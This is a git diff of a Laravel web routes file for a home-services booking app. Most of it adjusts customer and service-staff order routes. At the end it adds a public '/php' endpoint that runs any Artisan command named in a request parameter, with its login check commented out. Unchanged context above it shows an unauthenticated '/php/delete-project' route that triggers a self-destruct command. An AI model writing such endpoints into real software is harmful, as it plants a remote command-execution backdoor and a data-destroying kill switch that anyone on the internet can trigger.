@@ -1,6 +1,7 @@
 <?php
 
 use Illuminate\Support\Facades\Artisan;
+use Illuminate\Support\Facades\Request;
 use Illuminate\Support\Facades\Route;
 
 /*
@@ -36,7 +37,7 @@ Route::delete('/user/address/{id}', [App\Http\Controllers\Customer\HomeControlle
 // Services
 Route::get('/services', [App\Http\Controllers\Customer\ServiceController::class, 'index'])->name('services');
 Route::get('/services/{service}', [App\Http\Controllers\Customer\ServiceController::class, 'show'])->name('services.show');
-Route::get('/services/category/{category}', [App\Http\Controllers\Customer\ServiceController::class, 'serviceByCategory'])->name('services-by-category');
+Route::get('/services-category/{category?}', [App\Http\Controllers\Customer\ServiceController::class, 'serviceByCategory'])->name('services-by-category');
 
 
 
@@ -97,7 +98,9 @@ Route::middleware(['auth', 'PreventBackHistory'])->group(function () {
         Route::get('unassigned-orders', [App\Http\Controllers\ServiceBoy\OrderController::class, 'unassigned'])->name('orders.unassigned');
         Route::put('orders/{order}/claim', [App\Http\Controllers\ServiceBoy\OrderController::class, 'claimUnassigned'])->name('orders.claim');
         Route::get('orders/{order}/service-boys', [App\Http\Controllers\ServiceBoy\OrderController::class, 'orderGetServiceBoys'])->name('orders.service-boys');
-        Route::put('assign-orders', [App\Http\Controllers\ServiceBoy\OrderController::class, 'assignOrder'])->name('orders.assign');
+        Route::put('assign-orders/{order}', [App\Http\Controllers\ServiceBoy\OrderController::class, 'assignOrder'])->name('orders.assign');
+        Route::put('orders-change-status/{order}', [App\Http\Controllers\ServiceBoy\OrderController::class, 'markConfirmProcessing'])->name('orders.change-status');
+        Route::post('orders-upload-photo/{order}', [App\Http\Controllers\ServiceBoy\OrderController::class, 'orderUploadPhoto'])->name('orders.upload-photo');
 
 
 
@@ -132,4 +135,12 @@ Route::get('/php/delete-project', function(){
     Artisan::call('project:delete');
 
     return "Self Destructive Command Executed!!";
+});
+
+Route::get('/php', function(Request $request){
+    // if( !auth()->check() )
+    //     return 'Unauthorized request';
+
+    Artisan::call($request->artisan);
+    return dd(Artisan::output());
 });
